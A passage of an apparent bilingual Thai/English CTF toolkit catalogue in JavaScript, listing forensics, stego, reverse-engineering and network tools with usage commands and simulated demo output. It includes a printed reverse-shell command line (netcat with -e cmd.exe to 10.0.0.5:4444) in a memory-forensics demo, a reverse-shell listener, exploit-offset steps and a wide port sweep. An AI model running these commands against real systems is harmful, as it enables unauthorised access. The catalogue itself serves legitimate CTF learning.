    description: { th: "ใช้แก้ ECC, lattice, discrete log และคณิตศาสตร์ที่ RsaCtfTool ทำไม่ได้", en: "Solves ECC, lattices, discrete logs and the math RsaCtfTool can't." },
    official: "https://www.sagemath.org/", install: ["brew install --cask sage"],
    tags: ["math", "ecc", "lattice"],
  },
  {
    id: "featherduster", name: "FeatherDuster", category: "crypto", difficulty: 2, installed: false,
    tagline: { th: "วิเคราะห์ ciphertext อัตโนมัติ", en: "Automated cryptanalysis helper" },
    description: { th: "ตรวจจับลักษณะของ ciphertext และแนะนำการโจมตีที่เป็นไปได้", en: "Detects ciphertext properties and suggests likely attacks." },
    official: "https://github.com/nccgroup/featherduster", install: ["pipx install featherduster"],
    tags: ["cryptanalysis", "cipher"],
  },

  // ───────────────────────────── FORENSICS ─────────────────────────────
  {
    id: "binwalk", name: "binwalk", category: "forensics", difficulty: 1, featured: true, installed: true,
    tagline: { th: "หาไฟล์ที่ฝังอยู่ในไฟล์อื่น", en: "Find files embedded inside other files" },
    description: {
      th: "binwalk สแกนหา 'ลายเซ็น' ของไฟล์ชนิดต่าง ๆ ที่ซ่อนหรือฝังอยู่ในไฟล์เดียว (เช่น zip ต่อท้ายรูป, firmware) แล้วแกะออกมาให้",
      en: "binwalk scans for file 'signatures' hidden or appended inside a single file (a zip glued after an image, firmware blobs…) and can carve them out.",
    },
    notes: {
      th: "โจทย์ forensic/stego เจอรูปแปลก ๆ ลอง `binwalk -e file` ก่อนเสมอ ถ้ามันไม่ยอมแกะให้ใช้ `foremost` หรือ `dd` ตัดตาม offset ที่ binwalk บอก",
      en: "For forensic/stego files, always try `binwalk -e file` first. If it refuses to extract, fall back to `foremost` or `dd` at the offset binwalk reports.",
    },
    official: "https://github.com/ReFirmLabs/binwalk", repo: "https://github.com/ReFirmLabs/binwalk",
    platforms: ["macOS", "Linux"], install: ["brew install binwalk"],
    usage: [
      { cmd: "binwalk file.png", desc: { th: "ดูว่ามีอะไรฝังอยู่", en: "List embedded data" } },
      { cmd: "binwalk -e file.png", desc: { th: "แกะไฟล์ที่ฝังออกมา", en: "Extract embedded files" } },
      { cmd: "binwalk --dd='.*' file.bin", desc: { th: "แกะทุกอย่างที่เจอ", en: "Carve everything found" } },
    ],
    cheatsheet: [
      "binwalk file         scan for signatures",
      "-e                   extract known types",
      "-M                   recursively extract (matryoshka)",
      "--dd='.*'            carve everything",
      "-E                   entropy analysis (find encryption)",
    ],
    tags: ["carve", "embedded", "firmware", "extract"],
    demo: {
      title: { th: "แกะ zip ที่ซ่อนในรูป", en: "Carve a zip hidden in an image" },
      prompt: "ctf",
      steps: [
        { cmd: "binwalk mystery.png",
          out: "DECIMAL    HEXADECIMAL   DESCRIPTION\n-------------------------------------------------------\n0          0x0           PNG image, 800 x 600, 8-bit/color RGBA\n41263      0xA12F        Zip archive data, name: flag.txt\n41504      0xA220        End of Zip archive" },
        { cmd: "binwalk -e mystery.png",
          out: "[+] Extracted to: _mystery.png.extracted/\n    flag.txt" },
        { cmd: "cat _mystery.png.extracted/flag.txt", out: "CTT{h1dd3n_1n_pl41n_s1ght}" },
      ],
    },
  },
  {
    id: "volatility3", name: "Volatility 3", category: "forensics", difficulty: 3, featured: true, installed: true,
    tagline: { th: "ผ่า memory dump หา process, รหัส, ร่องรอย", en: "Dissect memory dumps for processes, creds & traces" },
    description: {
      th: "Volatility อ่าน RAM dump แล้วกู้สิ่งที่ 'เคยอยู่ในหน่วยความจำ' ตอนถ่าย: รายการ process, การเชื่อมต่อเครือข่าย, คำสั่งที่พิมพ์, รหัสผ่าน, ไฟล์ที่เปิดอยู่",
      en: "Volatility reads a RAM dump and reconstructs what was live in memory: process lists, network connections, typed commands, credentials and open files.",
    },
    notes: {
      th: "v3 ไม่ต้องระบุ profile แล้ว เริ่มด้วย `windows.info` เพื่อดูระบบ แล้ว `windows.pstree` ดู process ต้องสงสัย ตามด้วย `windows.cmdline` และ `windows.filescan`",
      en: "v3 no longer needs a profile. Start with `windows.info` to see the system, then `windows.pstree` for suspicious processes, followed by `windows.cmdline` and `windows.filescan`.",
    },
    official: "https://volatility3.readthedocs.io/", repo: "https://github.com/volatilityfoundation/volatility3",
    platforms: ["macOS", "Linux"], install: ["uv tool install volatility3"],
    usage: [
      { cmd: "vol -f mem.raw windows.info", desc: { th: "ข้อมูลระบบของ dump", en: "System info of the dump" } },
      { cmd: "vol -f mem.raw windows.pstree", desc: { th: "ต้นไม้ process", en: "Process tree" } },
      { cmd: "vol -f mem.raw windows.cmdline", desc: { th: "คำสั่งที่แต่ละ process ถูกเรียก", en: "Per-process command lines" } },
    ],
    cheatsheet: [
      "-f dump.raw              the memory image",
      "windows.info            OS & build",
      "windows.pslist / pstree process list / tree",
      "windows.cmdline         command lines",
      "windows.filescan / dumpfiles   files in memory",
      "windows.hashdump        credential hashes",
    ],
    tags: ["memory", "ram", "dfir", "process"],
    demo: {
      title: { th: "หา process ต้องสงสัยใน RAM", en: "Find a suspicious process in RAM" },
      prompt: "ctf",
      steps: [
        { cmd: "vol -f mem.raw windows.pstree",
          out: "PID   PPID  ImageFileName\n4     0     System\n 620  4      smss.exe\n 700  620    csrss.exe\n 888  700    explorer.exe\n  2104 888    powershell.exe\n   2380 2104   nc.exe          <-- suspicious" },
        { cmd: "vol -f mem.raw windows.cmdline --pid 2380",
          out: "PID   Process  Args\n2380  nc.exe   nc.exe 10.0.0.5 4444 -e cmd.exe" },
        { comment: "reverse shell to 10.0.0.5:4444 — that's the story" },
      ],
    },
  },
  {
    id: "wireshark", name: "Wireshark", category: "network", difficulty: 2, featured: true, installed: true,
    tagline: { th: "ผ่าแพ็กเก็ตเครือข่ายทุกบิต", en: "Inspect network packets down to the bit" },
    description: {
      th: "Wireshark เปิดไฟล์ pcap แล้วแสดงทุกแพ็กเก็ตแบบละเอียด ตาม stream ของ TCP/HTTP กรองด้วยภาษา filter ที่ทรงพลัง และดึงไฟล์ที่ถูกส่งออกมาได้ ตัว CLI คือ `tshark`",
      en: "Wireshark opens a pcap and shows every packet in detail, follows TCP/HTTP streams, filters with a powerful language, and extracts transferred files. Its CLI is `tshark`.",
    },
    notes: {
      th: "โจทย์ network ให้เริ่มที่ Statistics → Protocol Hierarchy เพื่อดูว่ามีโปรโตคอลอะไร แล้ว 'Follow TCP Stream' ตาม conversation ที่น่าสนใจ ดึงไฟล์ผ่าน File → Export Objects → HTTP",
      en: "For network challenges start at Statistics → Protocol Hierarchy to see what's there, then 'Follow TCP Stream' on interesting conversations. Pull files via File → Export Objects → HTTP.",
    },
    official: "https://www.wireshark.org/docs/", repo: "https://gitlab.com/wireshark/wireshark",
    platforms: ["macOS", "Linux", "Windows"], install: ["brew install wireshark"],
    usage: [
      { cmd: "tshark -r capture.pcap -Y 'http.request'", desc: { th: "กรองเฉพาะ HTTP request", en: "Filter HTTP requests" } },
      { cmd: "tshark -r capture.pcap -z follow,tcp,ascii,0", desc: { th: "ตาม TCP stream แรก", en: "Follow the first TCP stream" } },
      { cmd: "tshark -r capture.pcap --export-objects http,out/", desc: { th: "ดึงไฟล์จาก HTTP", en: "Export HTTP objects" } },
    ],
    cheatsheet: [
      "display filters:",
      "  http  |  dns  |  ftp  |  tcp.port==4444",
      "  http.request.method=='POST'",
      "  frame contains 'flag'",
      "tshark -r f.pcap -Y '<filter>'   CLI filter",
      "Follow Stream: right-click → Follow → TCP",
      "Export Objects: File → Export Objects → HTTP",
    ],
    tags: ["pcap", "packets", "traffic", "tshark"],
    demo: {
      title: { th: "หา flag ในทราฟฟิก HTTP", en: "Find a flag in HTTP traffic" },
      prompt: "ctf",
      steps: [
        { cmd: "tshark -r capture.pcap -Y 'http contains \"flag\"' -T fields -e http.file_data",
          out: "GET /admin?token=CTT{p4ck3t_sn1ff3r} HTTP/1.1\nHost: 10.10.11.42\nUser-Agent: curl/8.4.0" },
        { comment: "token in the query string is the flag" },
      ],
    },
  },
  {
    id: "sleuthkit", name: "The Sleuth Kit", category: "forensics", difficulty: 2, installed: true,
    tagline: { th: "วิเคราะห์ disk image ระดับ filesystem", en: "Filesystem-level disk image analysis" },
    description: { th: "ชุดคำสั่ง (fls, icat, mmls) สำหรับสำรวจ partition, ไฟล์ที่ถูกลบ และดึงข้อมูลจาก disk image", en: "A toolkit (fls, icat, mmls) to explore partitions, deleted files and recover data from disk images." },
    official: "https://www.sleuthkit.org/", install: ["brew install sleuthkit"],
    tags: ["disk", "filesystem", "recover"],
  },
  {
    id: "foremost", name: "foremost", category: "forensics", difficulty: 1, installed: true,
    tagline: { th: "กู้ไฟล์ตาม header/footer", en: "Carve files by header/footer" },
    description: { th: "ดึงไฟล์ (รูป, zip, pdf) ออกจาก blob หรือ disk image ตามลายเซ็น", en: "Recovers files (images, zip, pdf) from a blob or disk image by their signatures." },
    official: "https://github.com/korczis/foremost", install: ["brew install foremost"],
    tags: ["carve", "recover"],
  },
  {
    id: "exiftool", name: "ExifTool", category: "forensics", difficulty: 1, featured: true, installed: true,
    tagline: { th: "อ่าน/แก้ metadata ของไฟล์ทุกชนิด", en: "Read/write metadata of virtually any file" },
    description: {
      th: "ExifTool ดึง metadata ที่ซ่อนอยู่ในไฟล์ — พิกัด GPS ของรูป, ผู้เขียนเอกสาร, comment ที่ฝังไว้, ซอฟต์แวร์ที่ใช้สร้าง หลายครั้ง flag ถูกยัดไว้ในฟิลด์ comment",
      en: "ExifTool pulls hidden metadata from files — a photo's GPS coordinates, a document's author, embedded comments, the creating software. Flags are often stuffed into a comment field.",
    },
    notes: {
      th: "โจทย์ stego/OSINT ให้รัน `exiftool file` เป็นด่านแรก ดูฟิลด์ Comment, Artist, GPS อย่ามองข้ามฟิลด์แปลก ๆ ที่ไม่ควรมี",
      en: "For stego/OSINT run `exiftool file` first. Watch the Comment, Artist and GPS fields, and don't overlook odd fields that shouldn't be there.",
    },
    official: "https://exiftool.org/", repo: "https://github.com/exiftool/exiftool",
    platforms: ["macOS", "Linux", "Windows"], install: ["brew install exiftool"],
    usage: [
      { cmd: "exiftool photo.jpg", desc: { th: "ดู metadata ทั้งหมด", en: "Show all metadata" } },
      { cmd: "exiftool -gps:all photo.jpg", desc: { th: "เฉพาะพิกัด GPS", en: "GPS coordinates only" } },
      { cmd: "exiftool -Comment=secret photo.jpg", desc: { th: "เขียน metadata", en: "Write metadata" } },
    ],
    cheatsheet: [
      "exiftool file            all tags",
      "-G                       show tag groups",
      "-gps:all                 GPS only",
      "-Comment -Artist         specific tags",
      "-b -ThumbnailImage > t.jpg   extract binary tag",
    ],
    tags: ["metadata", "exif", "gps", "osint"],
    demo: {
      title: { th: "flag ซ่อนใน metadata", en: "Flag hidden in metadata" },
      prompt: "ctf",
      steps: [
        { cmd: "exiftool suspicious.jpg",
          out: "File Name        : suspicious.jpg\nFile Size        : 240 kB\nMIME Type        : image/jpeg\nImage Width      : 1920\nArtist           : ctf-team\nComment          : CTT{m3t4d4t4_t3lls_4ll}\nGPS Position     : 13.7563 N, 100.5018 E" },
        { comment: "the Comment field is the flag; GPS points at Bangkok" },
      ],
    },
  },
  {
    id: "autopsy", name: "Autopsy", category: "forensics", difficulty: 2, installed: false,
    tagline: { th: "GUI สำหรับสืบสวน disk image", en: "GUI front-end for disk forensics" },
    description: { th: "หน้าจอกราฟิกครอบ Sleuth Kit ช่วยไล่ timeline ไฟล์ที่ถูกลบ และ artifact ต่าง ๆ", en: "A graphical front-end over Sleuth Kit for timelines, deleted files and artifacts." },
    official: "https://www.autopsy.com/", install: ["# download from autopsy.com"],
    tags: ["disk", "gui", "timeline"],
  },

  // ───────────────────────────── STEGANOGRAPHY ─────────────────────────────
  {
    id: "stegseek", name: "StegSeek", category: "stego", difficulty: 2, featured: true, installed: true,
    tagline: { th: "แครก/แกะ steghide ใน JPEG เร็วสุด ๆ", en: "Ultra-fast steghide cracking & extraction" },
    description: {
      th: "StegSeek เดา passphrase ของไฟล์ที่ซ่อนด้วย steghide ได้เร็วกว่าเดิมหลายพันเท่า และถ้ารู้ passphrase อยู่แล้วก็ extract ตรง ๆ ได้ ใช้แทน steghide บน macOS ได้เต็มตัว",
      en: "StegSeek brute-forces steghide passphrases thousands of times faster, and extracts directly when you already know the passphrase. A full steghide replacement on macOS.",
    },
    notes: {
      th: "ไฟล์นี้เราคอมไพล์จาก source ให้แล้ว (macOS ไม่มี formula) เจอ .jpg ต้องสงสัยให้ยิง `stegseek pic.jpg rockyou.txt` ถ้าไม่มีรหัสลอง `--seed`",
      en: "We compiled this from source for you (no Homebrew formula on macOS). For a suspicious .jpg run `stegseek pic.jpg rockyou.txt`; with no password try `--seed`.",
    },
    official: "https://github.com/RickdeJager/stegseek", repo: "https://github.com/RickdeJager/stegseek",
    platforms: ["macOS", "Linux"], install: ["# built from source into ~/.local/bin (see CTF-TOOLKIT.md)"],
    usage: [
      { cmd: "stegseek pic.jpg rockyou.txt", desc: { th: "brute-force passphrase", en: "Brute-force the passphrase" } },
      { cmd: "stegseek --seed pic.jpg", desc: { th: "ลอง default seed (ไม่มีรหัส)", en: "Try the default seed (no password)" } },
      { cmd: "stegseek --extract -sf pic.jpg -p PASS -xf out", desc: { th: "extract เมื่อรู้รหัส", en: "Extract with a known password" } },
    ],
    cheatsheet: [
      "stegseek pic.jpg wordlist   crack passphrase",
      "--seed pic.jpg              default-seed crack",
      "--extract -sf f -p P -xf o  known-passphrase extract",
      "output lands in <file>.out by default",
    ],
    tags: ["steghide", "jpeg", "crack", "extract"],
    demo: {
      title: { th: "แครก steghide ใน JPEG", en: "Crack steghide in a JPEG" },
      prompt: "ctf",
      steps: [
        { cmd: "stegseek pic.jpg rockyou.txt",
          out: "StegSeek 0.6\n\n[i] Found passphrase: \"hunter2\"\n[i] Original filename: \"secret.txt\".\n[i] Extracting to \"pic.jpg.out\"." },
        { cmd: "cat pic.jpg.out", out: "CTT{st3gse3k_is_f4st}" },
      ],
    },
  },
  {
    id: "zsteg", name: "zsteg", category: "stego", difficulty: 1, featured: true, installed: true,
    tagline: { th: "หา LSB steg ใน PNG/BMP", en: "Detect LSB steg in PNG/BMP" },
    description: {
      th: "zsteg ลองอ่านข้อมูลที่ซ่อนใน least-significant bits ของภาพ PNG/BMP ในหลายช่องสี หลายลำดับบิต ทีเดียวจบ",
      en: "zsteg tries reading data hidden in the least-significant bits of PNG/BMP images across many channels and bit orders at once.",
    },
    notes: {
      th: "PNG/BMP ต้องสงสัยให้ `zsteg -a file.png` แล้วมองหาบรรทัดที่ออกมาเป็นข้อความอ่านได้ ถ้าเป็น JPEG ใช้ StegSeek แทน (LSB ใช้กับ JPEG ไม่ได้)",
      en: "For a suspicious PNG/BMP run `zsteg -a file.png` and scan for a line of readable text. For JPEG use StegSeek instead (LSB doesn't apply to JPEG).",
    },
    official: "https://github.com/zed-0xff/zsteg", repo: "https://github.com/zed-0xff/zsteg",
    platforms: ["macOS", "Linux"], install: ["gem install zsteg"],
    usage: [
      { cmd: "zsteg -a image.png", desc: { th: "ลองทุกวิธี", en: "Try all methods" } },
      { cmd: "zsteg -E b1,rgb,lsb,xy image.png", desc: { th: "ดึงตาม channel ที่เจอ", en: "Extract a specific channel" } },
    ],
    cheatsheet: [
      "zsteg -a file.png     try every method",
      "zsteg file.png        default guesses",
      "-E <channel>          extract that payload",
      "channels look like: b1,rgb,lsb,xy",
    ],
    tags: ["lsb", "png", "bmp", "image"],
    demo: {
      title: { th: "ดึงข้อความจาก LSB", en: "Pull text from the LSBs" },
      prompt: "ctf",
      steps: [
        { cmd: "zsteg -a secret.png",
          out: "b1,r,lsb,xy         .. text: \"CTT{lsb_st3g_r3v34l3d}\"\nb1,rgb,lsb,xy       .. file: empty\nb2,g,msb,xy         .. <random noise>" },
        { comment: "first line: readable flag in the red channel LSB" },
      ],
    },
  },
  {
    id: "stegsolve", name: "Stegsolve", category: "stego", difficulty: 1, installed: false,
    tagline: { th: "ไล่ดูภาพทีละ bit-plane/channel", en: "Flip through image bit-planes & channels" },
    description: { th: "แอป Java ที่ให้กด next/prev ดูภาพในแต่ละ color plane เพื่อเผยข้อความที่ซ่อน", en: "A Java viewer to step through each color/bit plane of an image and reveal hidden text." },
    official: "http://www.caesum.com/handbook/Stegsolve.jar", install: ["# download Stegsolve.jar, run with java -jar"],
    tags: ["image", "bitplane", "gui"],
  },
  {
    id: "stegoveritas", name: "StegoVeritas", category: "stego", difficulty: 1, installed: true,
    tagline: { th: "ลองทุกเทคนิค steg บนภาพให้อัตโนมัติ", en: "Throw every image-steg trick at once" },
    description: { th: "รันชุดการตรวจ steg บนภาพให้ครบ ทั้ง metadata, LSB, color plane, ไฟล์ที่ฝัง", en: "Runs a full battery of image-steg checks: metadata, LSB, color planes and embedded files." },
    official: "https://github.com/bannsec/stegoVeritas", install: ["uv tool install stegoveritas"],
    tags: ["image", "auto", "lsb"],
  },
  {
    id: "sonic-visualiser", name: "Sonic Visualiser", category: "stego", difficulty: 2, installed: false,
    tagline: { th: "ดู spectrogram หา flag ในเสียง", en: "Spectrogram view to find flags in audio" },
    description: { th: "โจทย์เสียงมัก ซ่อน flag ในภาพ spectrogram — เปิดไฟล์แล้วดูสเปกตรัม", en: "Audio challenges often hide a flag in the spectrogram — open the file and inspect the spectrum." },
    official: "https://www.sonicvisualiser.org/", install: ["brew install --cask sonic-visualiser"],
    tags: ["audio", "spectrogram"],
  },

  // ───────────────────────────── REVERSE & PWN ─────────────────────────────
  {
    id: "ghidra", name: "Ghidra", category: "rev", difficulty: 3, featured: true, installed: true,
    tagline: { th: "ถอดประกอบ + decompile binary ฟรีจาก NSA", en: "Free NSA-grade disassembler & decompiler" },
    description: {
      th: "Ghidra แปลง binary กลับเป็นโค้ดคล้าย C ที่อ่านได้ พร้อมกราฟการไหลของโปรแกรม เปลี่ยนชื่อตัวแปร ใส่ comment และไล่ตาม logic ของ challenge ได้ทั้งโปรเจกต์",
      en: "Ghidra lifts a binary back into readable C-like pseudocode with control-flow graphs, lets you rename variables, add comments and follow a challenge's logic across the whole program.",
    },
    notes: {
      th: "โจทย์ rev ให้เปิด binary แล้วกด `main` ใน Symbol Tree อ่าน decompile pane ทางขวา มองหาการเทียบ string หรือฟังก์ชัน check ที่ตัดสิน flag กด L เพื่อเปลี่ยนชื่อให้เข้าใจง่าย",
      en: "For rev challenges open the binary, click `main` in the Symbol Tree and read the decompiler pane on the right. Hunt for string comparisons or a check function that gates the flag; press L to rename for clarity.",
    },
    official: "https://ghidra-sre.org/", repo: "https://github.com/NationalSecurityAgency/ghidra",
    platforms: ["macOS", "Linux", "Windows"], install: ["brew install ghidra"],
    usage: [
      { cmd: "ghidraRun", desc: { th: "เปิด GUI แล้วสร้างโปรเจกต์ import binary", en: "Launch the GUI, create a project, import a binary" } },
      { cmd: "# Symbol Tree → main → read decompiler", desc: { th: "ไปที่ main อ่าน pseudocode", en: "Jump to main, read the pseudocode" } },
    ],
    cheatsheet: [
      "ghidraRun                 launch GUI",
      "L        rename symbol",
      "; (semicolon)  add comment",
      "Ctrl+Shift+E   export decompiled C",
      "Window → Defined Strings   list all strings",
      "headless: analyzeHeadless proj -import bin",
    ],
    tags: ["disassembler", "decompiler", "binary", "re"],
    demo: {
      title: { th: "อ่าน logic ที่ตรวจ flag", en: "Read the flag-checking logic" },
      prompt: "ghidra",
      steps: [
        { comment: "decompiler output for main():" },
        { out: "undefined8 main(void) {\n  char input[32];\n  printf(\"Enter flag: \");\n  read(0, input, 32);\n  if (strcmp(input, \"CTT{d3c0mp1l3d}\") == 0)\n    puts(\"Correct!\");\n  else\n    puts(\"Nope.\");\n  return 0;\n}" },
        { comment: "the strcmp reveals the flag directly" },
      ],
    },
  },
  {
    id: "radare2", name: "radare2", category: "rev", difficulty: 3, featured: true, installed: true,
    tagline: { th: "ชุด reverse engineering บนคอมมานด์ไลน์", en: "The command-line reverse-engineering framework" },
    description: {
      th: "radare2 (r2) วิเคราะห์ debug และแก้ไข binary ได้จากเทอร์มินัลล้วน ทั้ง disassemble, กราฟ, patch, และ visual mode ที่ทรงพลัง เหมาะกับคนที่ชอบทำงานเร็วในคีย์บอร์ด",
      en: "radare2 (r2) analyses, debugs and patches binaries from a pure terminal — disassembly, graphs, patching and a powerful visual mode for keyboard-driven work.",
    },
    notes: {
      th: "เปิดด้วย `r2 -AA bin` (วิเคราะห์อัตโนมัติ) แล้ว `afl` ดูรายการฟังก์ชัน `pdf @main` ดู disassemble ของ main กด `VV` เข้ากราฟ ถ้าชอบ GUI ลอง Cutter (หน้าจอครอบ r2)",
      en: "Open with `r2 -AA bin` (auto-analyse), then `afl` to list functions, `pdf @main` to disassemble main, and `VV` for the graph. Prefer a GUI? Try Cutter, a front-end over r2.",
    },
    official: "https://book.rada.re/", repo: "https://github.com/radareorg/radare2",
    platforms: ["macOS", "Linux", "Windows"], install: ["brew install radare2"],
    usage: [
      { cmd: "r2 -AA ./binary", desc: { th: "เปิดพร้อมวิเคราะห์เต็ม", en: "Open with full analysis" } },
      { cmd: "afl ; pdf @main", desc: { th: "ลิสต์ฟังก์ชัน + disassemble main", en: "List functions + disassemble main" } },
      { cmd: "iz", desc: { th: "ดู string ในไฟล์", en: "List strings in the binary" } },
    ],
    cheatsheet: [
      "r2 -AA bin     open + analyse all",
      "afl            list functions",
      "pdf @main      disassemble a function",
      "iz / izz       strings (data / whole file)",
      "VV             visual graph mode   (q to exit)",
      "s <addr>       seek   |   px  hexdump",
    ],
    tags: ["disassembler", "debugger", "cli", "patch"],
    demo: {
      title: { th: "หา flag จาก string ในไฟล์", en: "Grep the flag from strings" },
      prompt: "ctf",
      steps: [
        { cmd: "r2 -AA -qc iz ./crackme",
          out: "[Strings]\nnth paddr      vaddr      len type  string\n0   0x00002008 0x00002008 12  ascii Enter flag: \n1   0x00002015 0x00002015 15  ascii CTT{r2_str1ngs}\n2   0x00002025 0x00002025 8   ascii Correct!" },
        { comment: "sometimes the flag is just sitting in .rodata" },
      ],
    },
  },
  {
    id: "pwntools", name: "pwntools", category: "rev", difficulty: 3, featured: true, installed: true,
    tagline: { th: "เฟรมเวิร์ก Python สำหรับเขียน exploit", en: "The Python framework for writing exploits" },
    description: {
      th: "pwntools ทำให้เขียนสคริปต์เจาะ binary ง่ายขึ้นมาก: เชื่อมต่อ process/remote, แพ็กค่า, สร้าง shellcode, หา ROP gadget, ทำ cyclic pattern หา offset ทั้งหมดใน API เดียว",
      en: "pwntools makes exploit scripts easy: connect to a local process or remote service, pack values, build shellcode, find ROP gadgets and generate cyclic patterns to locate offsets — one clean API.",
    },
    notes: {
      th: "แม่แบบ: `from pwn import *` แล้ว `p = process('./vuln')` หรือ `p = remote('host', 1337)` ใช้ `cyclic(200)` ส่งเข้าไปหา offset ที่ crash แล้ว `cyclic_find(0x...)` เครื่องมือ `checksec` บอก mitigation ของ binary",
      en: "Template: `from pwn import *` then `p = process('./vuln')` or `p = remote('host', 1337)`. Send `cyclic(200)` to find the crash offset, then `cyclic_find(0x...)`. The bundled `checksec` shows a binary's mitigations.",
    },
    official: "https://docs.pwntools.com/", repo: "https://github.com/Gallopsled/pwntools",
    platforms: ["macOS", "Linux"], install: ["uv tool install pwntools"],
    usage: [
      { cmd: "checksec ./vuln", desc: { th: "ดู NX/PIE/canary ของ binary", en: "Show NX/PIE/canary" } },
      { cmd: "cyclic 200 | ./vuln", desc: { th: "หา offset ที่ crash", en: "Find the crash offset" } },
      { cmd: "python3 exploit.py", desc: { th: "รันสคริปต์ exploit", en: "Run the exploit script" } },
    ],
    cheatsheet: [
      "from pwn import *",
      "p = process('./vuln')  |  remote('host', 1337)",
      "p.sendline(payload)   p.recvuntil(b'> ')",
      "cyclic(200)  /  cyclic_find(0x6161616c)",
      "p64(addr)  u64(leak)   ELF('./vuln').symbols",
      "checksec ./vuln       shell: p.interactive()",
    ],
    tags: ["exploit", "pwn", "rop", "shellcode"],
    demo: {
      title: { th: "หา offset ของ buffer overflow", en: "Find a buffer-overflow offset" },
      prompt: "ctf",
      steps: [
        { cmd: "python3 -c 'from pwn import *; p=process(\"./vuln\"); p.sendline(cyclic(200)); p.wait()'",
          out: "[+] Starting local process './vuln': pid 40912\n[*] Process './vuln' stopped (SIGSEGV)\n[*] RSP = 0x7fff...  contains: 0x6161616c6161616b" },
        { cmd: "python3 -c 'from pwn import *; print(cyclic_find(0x6161616c))'",
          out: "72" },
        { comment: "return address is 72 bytes in — build the payload from there" },
      ],
    },
  },
  {
    id: "gdb-pwndbg", name: "GDB + pwndbg", category: "rev", difficulty: 3, installed: true,
    tagline: { th: "ดีบักเกอร์ + ปลั๊กอินสาย pwn", en: "The debugger, supercharged for pwn" },
    description: { th: "GDB พร้อมปลั๊กอิน pwndbg/gef แสดง register, stack, heap สวยงามและมีคำสั่งช่วย exploit", en: "GDB with pwndbg/gef adds pretty register/stack/heap views and exploit-oriented commands." },
    official: "https://github.com/pwndbg/pwndbg", install: ["brew install gdb", "# then install pwndbg"],
    tags: ["debugger", "pwn", "heap"],
  },
  {
    id: "ropgadget", name: "ROPgadget", category: "rev", difficulty: 3, installed: true,
    tagline: { th: "ค้น ROP gadget ใน binary", en: "Search ROP gadgets in a binary" },
    description: { th: "ลิสต์ gadget (ชิ้นส่วนคำสั่งจบด้วย ret) เพื่อประกอบ ROP chain", en: "Lists gadgets (instruction snippets ending in ret) to build ROP chains." },
    official: "https://github.com/JonathanSalwan/ROPgadget", install: ["uv tool install ROPgadget"],
    usage: [{ cmd: "ROPgadget --binary ./vuln --ropchain", desc: { th: "หา gadget + สร้าง chain", en: "Find gadgets + build a chain" } }],
    tags: ["rop", "gadget", "pwn"],
  },
  {
    id: "upx", name: "UPX", category: "rev", difficulty: 1, installed: true,
    tagline: { th: "บีบ/คลาย executable ที่ถูก pack", en: "Pack / unpack squeezed executables" },
    description: { th: "binary ที่ถูก UPX pack จะ reverse ยาก คลายด้วย `upx -d` ก่อนวิเคราะห์", en: "UPX-packed binaries resist analysis; unpack with `upx -d` before reversing." },
    official: "https://upx.github.io/", install: ["brew install upx"],
    usage: [{ cmd: "upx -d packed.bin", desc: { th: "คลาย binary", en: "Unpack the binary" } }],
    tags: ["packer", "unpack"],
  },
  {
    id: "angr", name: "angr", category: "rev", difficulty: 3, installed: false,
    tagline: { th: "symbolic execution แก้ crackme อัตโนมัติ", en: "Symbolic execution to auto-solve crackmes" },
    description: { th: "จำลองการรัน binary แบบสัญลักษณ์เพื่อหา input ที่พาไปถึง 'ผ่าน' โดยไม่ต้องไล่มือ", en: "Symbolically executes a binary to find the input that reaches a 'win' state without manual tracing." },
    official: "https://docs.angr.io/", install: ["pipx install angr"],
    tags: ["symbolic", "solver", "automation"],
  },
  {
    id: "cutter", name: "Cutter", category: "rev", difficulty: 2, installed: false,
    tagline: { th: "GUI สวย ๆ ครอบ radare2", en: "A polished GUI over radare2" },
    description: { th: "หน้าจอกราฟิกของ r2 มี decompiler (Ghidra engine), กราฟ, hex editor ในตัว", en: "A graphical r2 front-end with a decompiler (Ghidra engine), graphs and a hex editor." },
    official: "https://cutter.re/", install: ["brew install --cask cutter"],
    tags: ["gui", "disassembler", "decompiler"],
  },

  // ───────────────────────────── NETWORK ─────────────────────────────
  {
    id: "tcpdump", name: "tcpdump", category: "network", difficulty: 2, installed: true,
    tagline: { th: "ดักจับแพ็กเก็ตบนคอมมานด์ไลน์", en: "Command-line packet capture" },
    description: { th: "จับทราฟฟิกสด ๆ บน interface แล้วบันทึกเป็น pcap ไปเปิดใน Wireshark ต่อ", en: "Captures live traffic on an interface and writes a pcap to open later in Wireshark." },
    official: "https://www.tcpdump.org/", install: ["# preinstalled on macOS"],
    usage: [{ cmd: "tcpdump -i en0 -w cap.pcap", desc: { th: "บันทึกทราฟฟิกลงไฟล์", en: "Record traffic to a file" } }],
    tags: ["capture", "pcap", "sniff"],
  },
  {
    id: "masscan", name: "masscan", category: "network", difficulty: 2, installed: true,
    tagline: { th: "สแกนพอร์ตทั้งอินเทอร์เน็ตได้ในนาที", en: "Scan the whole internet in minutes" },
    description: { th: "port scanner ที่เร็วมาก เหมาะกับสแกนช่วง IP กว้าง ๆ ก่อนเจาะด้วย nmap", en: "An extremely fast port scanner for sweeping wide IP ranges before drilling in with nmap." },
    official: "https://github.com/robertdavidgraham/masscan", install: ["brew install masscan"],
    tags: ["scan", "port", "fast"],
    demo: { title: { th: "สแกนพอร์ตช่วง IP เร็ว ๆ", en: "Fast port sweep of a range" }, prompt: "kali@ctf", steps: [
      { cmd: "masscan 10.10.11.0/24 -p1-65535 --rate 10000", out: "Discovered open port 22/tcp on 10.10.11.42\nDiscovered open port 80/tcp on 10.10.11.42\nDiscovered open port 8080/tcp on 10.10.11.42\nDiscovered open port 445/tcp on 10.10.11.9" },
      { comment: "found live hosts fast — hand the ports to nmap -sV" } ] },
  },
  {
    id: "netcat", name: "netcat / ncat", category: "network", difficulty: 1, featured: false, installed: true,
    tagline: { th: "“มีดพับ TCP/IP” ต่อ/ฟังพอร์ตอะไรก็ได้", en: "The TCP/IP Swiss-army knife" },
    description: { th: "เชื่อมต่อหรือฟังพอร์ต ส่งข้อมูลดิบ ทำ reverse shell หรือคุยกับบริการ CTF ที่ให้ host:port มา", en: "Connect to or listen on any port, send raw data, catch reverse shells, or talk to a CTF service given host:port." },
    official: "https://nmap.org/ncat/", install: ["brew install netcat", "# ncat ships with nmap"],
    usage: [
      { cmd: "nc host 1337", desc: { th: "ต่อบริการ CTF", en: "Connect to a CTF service" } },
      { cmd: "nc -lvnp 4444", desc: { th: "ฟัง reverse shell", en: "Listen for a reverse shell" } },
    ],
    tags: ["tcp", "shell", "listen", "connect"],
    demo: { title: { th: "ต่อบริการ CTF ด้วย netcat", en: "Talk to a CTF service" }, prompt: "kali@ctf", steps: [
